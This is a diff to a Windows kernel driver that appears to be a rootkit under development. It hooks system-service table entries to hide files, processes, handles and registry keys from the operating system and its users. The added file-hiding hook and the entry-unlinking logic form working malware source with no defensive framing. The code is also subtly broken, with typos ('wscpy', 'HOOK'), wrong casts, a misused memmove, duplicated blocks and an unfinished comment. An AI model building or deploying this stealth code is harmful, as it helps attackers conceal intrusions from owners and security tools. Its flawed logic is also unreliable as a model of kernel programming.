@@ -47,6 +47,7 @@ typedef NTSYSAPI NTSTATUS ZwEnumerateValueKey_t(
 ZwQuerySystemInformation_t g_SysInfo = 0;
 ZwEnumerateKey_t g_EnumKey = 0;
 ZwEnumerateValueKey_t g_EnumValKey = 0;
+NtQuerySystemInformation_t g_QueryDir = 0;
 
 //Driver Unload Routine
 VOID DriverUnload(PDRIVER_OBJECT DriverObject){
@@ -87,7 +88,7 @@ NTSTATUS NTAPI HOOKED_NtQueryDirectoryFile( //Hooked function for hiding files a
     BOOLEAN RestartScan
 ) {
 
-    NTSTATUS status = OriginalNtQueryDirectoryFile( //Call the orginal
+    NTSTATUS status = g_QueryDir( //Call the orginal
         FileHandle, Event, ApcRoutine, ApcContext,
         IoStatusBlock, FileInformation, Length,
         FileInformationClass, ReturnSingleEntry,
@@ -96,6 +97,7 @@ NTSTATUS NTAPI HOOKED_NtQueryDirectoryFile( //Hooked function for hiding files a
 
     if (status == STATUS_SUCCESS && FileInformation != nullptr){ //Check if the call worked
         PFILE_DIRECTORY_INFORMATION dirinfo = (PFILE_DIRECTORY_INFORMATION)FileInformation;
+        PFILE_DIRECTORY_INFORMATION prev = nullptr;
         while (true){
             bool shouldHide = false;
 
@@ -107,14 +109,20 @@ NTSTATUS NTAPI HOOKED_NtQueryDirectoryFile( //Hooked function for hiding files a
             }
 
             if (shouldHide) {
-                if (dirinfo->NextEntryOffset != 0){
-                    dirinfo = (PFILE_DIRECTORY_INFORMATION)((PBYTE)dirinfo + dirinfo->NextEntryOffset); //Change the offset to skip the file
-
+                if (prev){
+                    if (dirinfo->NextEntryOffset != 0){
+                        prev->NextEntryOffset += dirinfo->NextEntryOffset; //Change the offset to skip the file
+                    } else {
+                        prev->NextEntryOffset = 0; //break early if it is the last one
+                    }
                 } else {
-                    break; //break early if it is the last one
+                    //memmove again, check on ipad how
+                    
                 }
+            } else {
+                prev = dirinfo;
             }
-
+    
             if (dirinfo->NextEntryOffset == 0) break;  //break if last one
 
             dirinfo = (PFILE_DIRECTORY_INFORMATION)((PBYTE)dirinfo + dirinfo->NextEntryOffset); //loop through
@@ -130,7 +138,7 @@ NTSTATUS NTAPI HOOKED_SYSTEM_PROCESS_INFORMATION( //Hooked NtQuerySystemINformat
     ULONG SystemInformationLength,
     PULONG ReturnLength
 ) {
-    NTSTATUS status = OriginalNtQuerySystemInformation( //Call original one
+    NTSTATUS status = g_SysInfo( //Call original one
         SystemInformationClass,
         SystemInformation,
         SystemInformationLength,
@@ -139,7 +147,9 @@ NTSTATUS NTAPI HOOKED_SYSTEM_PROCESS_INFORMATION( //Hooked NtQuerySystemINformat
     if (status == STATUS_SUCCESS) {
         PSSYSTEM_PROCESS_INFORMATION pspi = (PSSYSTEM_PROCESS_INFORMATION)SystemInformation;
         PSSYSTEM_PROCESS_INFORMATION prev = nullptr;
+        PSSYSTEM_PROCESS_INFORMATION next = nullptr;
         while (pspi) {
+            next = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pspi + pspi->NextEntryOffset);
             bool hide = false;
             for (int i = 0; i < pidstohide_count; ++i) {
                 if (pspi->ProcessId == (HANDLE)pidstohide[i]) { //cmp process id to the ones to hide
@@ -154,6 +164,10 @@ NTSTATUS NTAPI HOOKED_SYSTEM_PROCESS_INFORMATION( //Hooked NtQuerySystemINformat
                     } else {
                         prev->NextEntryOffset = 0; //if we are last one just set it to 0
                     }
+                } else {
+                    next->Offset = 0;
+                    next->NextEntryOffset += pspi->NextEntryOffset;
+                    memmove(&pspi, &next, next->NextEntryOffset);
                 }
                 if (pspi->NextEntryOffset == 0)
                     break; //break if last one
@@ -343,7 +357,10 @@ void __fastcall HideHandles_callback(unsigned long ssdt_index, void** ssdt_addre
     if (*ssdt_address == g_SysInfo) *ssdt_address = HOOKED_SYSTEM_HANDLE_INFORMATION_EX;
 }
 
-
+void __fastcall HideFIles_callback(unsigned long ssdt_index, void** ssdt_address){
+    UNREFERENCED_PARAMETER(ssdt_address);
+    if (*ssdt_address == g_QueryDir) *ssdt_address = HOOKED_NtQueryDirectoryFile;
+}
 
 
 
@@ -438,6 +455,16 @@ VOID DelayTimeWorkItem(PDEVICE_OBJECT DeviceObject, PVOID Context){
         }
     }
 
+    if (E_HideFiles){
+        wscpy(name, L"ZwQueryDirectoryFile");
+        RtlInitUnicodeString(&str, name);
+        g_QueryDir = (NtQuerySystemInformation_t)MmGetSystemRoutineAddress(&str);
+        Hook = k_hook::initialize(HideFIles_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
+        if (HOOK == STATUS_UNSUCCESSFUL){
+            log_debug("Failed to hook ZwQueryDirectoryFile!");
+        }
+    }
+
     NTSTATUS status = PsCreateSystemThread(&h_Thread, THREAD_ALL_ACCESS, NULL, NULL, NULL, KstartRoutine, NULL);
     if (!NT_SUCCESS(status)){
         log_debug("Failed to create a thread.");
@@ -502,7 +529,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath, 
             }
         }
 
-        if (E_HideFiles){
+        if (E_HideKeys){
             wcscpy(name, L"ZwEnumeratekey"); //hook
             RtlInitUnicodeString(&str, name);
             g_EnumKey = (ZwEnumerateKey_t)MmGetSystemRoutineAddress(&str);
@@ -528,7 +555,17 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath, 
             g_SysInfo = (ZwQuerySystemInformation_t)MmGetSystemRoutineAddress(&str);
             Hook = k_hook::initialize(HideHandles_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
             if (Hook == STATUS_UNSUCCESSFUL) {
-                log_debug("Failed to hook ZwQuerySysremInformation for: SYSTEM_HANDLE_INFORMATION_EX");
+                log_debug("Failed to hook ZwQuerySystemInformation for: SYSTEM_HANDLE_INFORMATION_EX");
+            }
+        }
+
+        if (E_HideFiles){
+            wscpy(name, L"ZwQueryDirectoryFile");
+            RtlInitUnicodeString(&str, name);
+            g_QueryDir = (NtQuerySystemInformation_t)MmGetSystemRoutineAddress(&str);
+            Hook = k_hook::initialize(HideFIles_callback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
+            if (HOOK == STATUS_UNSUCCESSFUL){
+                log_debug("Failed to hook ZwQueryDirectoryFile!");
             }
         }
 
